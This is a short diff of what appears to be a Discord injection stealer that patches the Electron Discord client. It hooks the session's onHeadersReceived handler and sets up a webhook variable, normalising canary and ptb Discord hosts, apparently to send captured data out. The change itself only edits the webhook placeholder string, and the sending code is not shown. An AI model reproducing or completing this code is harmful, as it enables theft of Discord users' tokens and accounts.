@@ -16,7 +16,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
 
 
-  var webhook = "%WEBHOOK_LINK%";
+  var webhook = "%WEBHOOK";
   webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   function FirstTime(){
       
